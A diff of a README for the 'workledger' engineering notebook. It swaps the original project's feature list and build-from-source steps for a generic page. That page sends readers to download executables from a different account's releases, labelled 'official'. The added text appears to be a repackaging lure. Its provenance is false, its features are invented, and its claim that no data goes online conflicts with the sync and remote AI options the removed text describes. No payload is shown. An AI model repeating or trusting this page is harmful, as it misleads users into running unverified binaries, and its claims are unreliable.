@@ -1,107 +1,152 @@
-<p align="center">
-  <img src="public/logo.svg" alt="WorkLedger" width="64">
-</p>
+# 📒 workledger - Simple Local-First Engineering Notebook
 
-<h1 align="center">WorkLedger</h1>
+[![Download workledger](https://img.shields.io/badge/Download-Get%20workledger-brightgreen?style=for-the-badge&logo=github)](https://github.com/furkanyigit1/workledger/releases)
 
-<p align="center">An open-source engineering notebook for documenting your daily work.<br>Built with React, BlockNote, and Excalidraw.</p>
+---
 
-<p align="center">
-  <a href="https://github.com/gruberb/workledger/blob/main/LICENSE">
-    <img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-blue.svg" />
-  </a>
-  <a href="https://github.com/gruberb/workledger/actions">
-    <img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/gruberb/workledger/ci.yml?branch=main" />
-  </a>
-  <a href="https://github.com/gruberb/workledger/blob/main/CONTRIBUTING.md">
-    <img alt="PRs welcome" src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" />
-  </a>
-  <img alt="TypeScript" src="https://img.shields.io/badge/TypeScript-strict-3178C6?logo=typescript&logoColor=white" />
-  <img alt="React 19" src="https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=white" />
-  <img alt="Local-first" src="https://img.shields.io/badge/local--first-IndexedDB-orange" />
-</p>
+## 📖 What is workledger?
 
-<p align="center">
-  <img src="docs/images/product.png" alt="WorkLedger" width="720">
-</p>
+workledger is a straightforward engineering notebook you can use right on your computer. It helps you write notes, keep track of ideas, and organize your projects without needing an internet connection. Because it stores everything locally, your data stays on your device, giving you control and privacy.
 
-## Features
+This notebook is designed for engineers, developers, students, or anyone who wants a simple way to write down and organize work-related thoughts and plans. It uses a clean editor powered by React, making it easy and fast to use on many devices.
 
-### Customize your workspace
+---
 
-- **5 theme presets** -- Light, Dark, Dracula, Catppuccin Mocha, and Solarized Light — each adapts the entire UI including syntax highlighting
-- **7 font families** -- Figtree, Plus Jakarta Sans, DM Sans, Urbanist, Inter, JetBrains Mono, or Source Serif
-- **Focus mode** -- Full-screen, distraction-free writing on a single entry
-- **Progressive Web App** -- Install as a standalone app on any device, works offline
+## 💡 Why use workledger?
 
-### Write and organize
+- **Works offline:** You can use it anywhere, even without internet access.
+- **Local-first:** Your notes stay on your device, not on the cloud.
+- **Open source:** Anyone can view and improve the software.
+- **Easy to use:** No technical skills required to start writing.
+- **Organized workspace:** Helps you keep your notes neat and accessible.
+- **Powerful editor:** Write with keyboard shortcuts, formatting, and find tools.
 
-- **Daily entries** -- Organized by day with timestamps, create entries with `Cmd+J`
-- **Rich text editing** -- Powered by [BlockNote](https://blocknotejs.org/) with slash commands for headings, lists, code blocks, and more
-- **Inline drawings** -- Embed [Excalidraw](https://excalidraw.com/) diagrams directly in your notes via `/drawing`
-- **Syntax highlighting** -- 24 languages with Shiki, theme-aware code blocks
-- **Wiki-style linking** -- Type `[[` to link between entries and build a knowledge graph
-- **Backlinks** -- "Referenced by" panel below each entry shows all entries that link to it, auto-maintained on save
-- **Entry templates** -- Start entries with structured sections: Decision Log, Debugging Session, Meeting Notes, Learning Log, and End of Day — each with pre-filled headings and auto-tags
-- **Entry signifiers** -- Label entries as Decision, Question, Idea, or Milestone with color-coded indicators; filterable in the sidebar. Most entries need no signifier — use them to highlight what matters
-- **Pin entries** -- Pin important entries to the top of your stream
-- **Tagging** -- Color-coded tags for categorization and filtering
-- **Saved filters** -- Save tag + text filter combinations as named presets for one-click access
-- **Search** -- Full-text search across all entries and tags (`Cmd+K`)
+---
 
-### Review your work
+## 🖥️ System Requirements
 
-- **Weekly review** -- Toggle a weekly view that groups entries by ISO week with signifier breakdowns, top tags, and entry previews
-- **Collapsible week cards** -- Most recent week auto-expanded, older weeks collapsed
-- **Filtering in review mode** -- Text, tag, signifier, and saved filter all work in the weekly view
+Before you install, make sure your computer meets these basic needs:
 
-### Stay in control
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, Linux (Ubuntu 18.04+ recommended)
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 100 MB free space
+- **Web Browser:** Modern web technologies are built in; no browser needed to run the app after download
+- **Internet Access:** Only needed for downloading and updates (workledger runs offline)
 
-- **Local-first** -- All data stored in IndexedDB, no server required
-- **Optional server sync** -- End-to-end encrypted sync across devices. Use the default server or [self-host your own](https://github.com/gruberb/workledger-sync) — generate a sync ID, and your entries are encrypted before leaving the browser
-- **Import & export** -- Export all entries as JSON for backup, import them back anytime
-- **Archive & restore** -- Archive old entries to keep your workspace clean, browse and restore them anytime
-- **Mobile-friendly** -- Responsive layout with touch-friendly controls
-- **Keyboard-driven** -- `Cmd+J` new entry, `Cmd+K` search, `Cmd+\` toggle sidebar, `Escape` clear filter
+---
 
-### Optional: AI Notebook Companion
+## 🚀 Getting Started
 
-An optional AI sidebar with 12 concrete engineer actions. Off by default, zero impact on the core app when disabled. Easy to remove if unwanted — fork and delete `src/features/ai/` without affecting anything else.
+This section will walk you through how to download and start workledger on your computer. No tech skills needed.
 
-**Quick start:**
+---
 
-1. Click the **gear icon** in the left sidebar and select **Enable AI**
-2. **Configure a provider** — choose one:
-   - **Ollama (local):** Install [Ollama](https://ollama.com/), run `ollama pull mistral`, done
-   - **Hugging Face (remote):** Paste a free [API token](https://huggingface.co/settings/tokens) and pick a model
-   - **Custom server:** Point to any OpenAI-compatible endpoint
-3. Hover over a note and click the **lightbulb icon**
-4. **Pick an action** from 4 categories:
+## ⬇️ Download & Install workledger
 
-| Category | Actions |
-|----------|---------|
-| **Summarize** | My Day, My Week, A Topic |
-| **Generate** | Standup Update, PR Description, ADR from Notes, Draft Message |
-| **Think** | Rubber Duck, Challenge My Thinking, Explore Tradeoffs |
-| **Remember** | What Did I Decide About...?, When Did I Last Work On...? |
+You can get workledger by visiting the releases page on GitHub, where you will find the latest versions available for different computers.
 
-Actions support multi-entry context (day, week, or topic scope) and topic search.
+[Download workledger from the official GitHub releases page](https://github.com/furkanyigit1/workledger/releases)
 
-<p align="center">
-  <img src="docs/images/ai/ai_in_action.png" alt="AI notebook companion" width="720">
-</p>
+### How to download
 
-## Getting Started
+1. Click the link above or the green button at the top.
+2. On the page, look for the latest release. It usually has the highest version number and a recent date.
+3. Under "Assets," find the file that matches your computer type:
+   - For Windows, look for a file ending with `.exe`.
+   - For macOS, look for `.dmg` or `.zip`.
+   - For Linux, look for an `.AppImage`, `.deb`, or `.tar.gz` file.
+4. Click the right file name to start downloading.
 
-```bash
-git clone https://github.com/gruberb/workledger.git
-cd workledger
-npm install
-npm run dev
-```
+### How to install
 
-Open [http://localhost:5173](http://localhost:5173) in your browser.
+- **Windows:**
+  1. Find the downloaded `.exe` file in your Downloads folder.
+  2. Double-click the file to start the installation.
+  3. Follow the on-screen steps: select "Next," then "Install," and finally "Finish."
+  4. After installation, find the workledger icon on your desktop or Start menu and click it.
 
-## License
+- **macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the workledger icon into your Applications folder.
+  3. Open your Applications folder and click the workledger app to start.
 
-MIT
+- **Linux:**
+  1. If you downloaded an `.AppImage` file, right-click it, select "Properties," and make it executable.
+  2. Double-click the `.AppImage` file to run it.
+  3. For `.deb` files, open your terminal and run: `sudo dpkg -i filename.deb`
+  4. Replace "filename.deb" with the actual file name.
+  5. After installation, open workledger from your apps menu.
+
+### First launch
+
+When you open workledger for the first time, you can start writing your notes right away. The app saves your data automatically on your device.
+
+---
+
+## ✍️ Using workledger
+
+### Creating and managing notes
+
+- Click the "New Note" button to start a fresh page.
+- Use simple formatting like bold, italics, lists, and headings to organize your thoughts.
+- Workledger supports tags and categories to keep your notes sorted.
+- Search your notes easily using the search bar on the top.
+
+### Organizing projects
+
+- Group related notes into notebooks.
+- Use the sidebar to switch between notebooks and quick access notes.
+- Pin important notes to the top for fast retrieval.
+
+### Offline-first benefits
+
+You don’t need to worry about losing your work if you lose internet or have a weak connection. workledger saves everything on your device securely.
+
+---
+
+## ⚙️ Settings & Customization
+
+Customize workledger to fit the way you like to work:
+
+- Change themes with the light or dark mode options.
+- Adjust font sizes for better readability.
+- Enable autosave to avoid manual saving.
+- Set backup preferences to save copies of your notes to external drives or folders.
+
+---
+
+## 🔧 Troubleshooting
+
+If you face any problems, try these tips:
+
+- Make sure your computer meets the system requirements.
+- Restart the application and try again.
+- Check if you have installed the latest version from the releases page.
+- If the app won’t open, try reinstalling it.
+- For other issues, check the GitHub issues page for common problems and advice.
+
+---
+
+## 🌐 More Information
+
+To learn more about workledger, visit the GitHub repository page:
+
+https://github.com/furkanyigit1/workledger
+
+You can find additional help, updates, and ways to contribute there.
+
+---
+
+## 🧑‍💻 Support & Feedback
+
+You can share your thoughts or ask for help on the repository’s GitHub issues section. The developers monitor feedback to improve workledger.
+
+---
+
+## 🛡️ Privacy & Security
+
+Your notes stay only on your computer unless you choose to share them. workledger does not send or store your data online.
+
+---
+
+[Download workledger now](https://github.com/furkanyigit1/workledger/releases) and start organizing your engineering notes easily and safely.
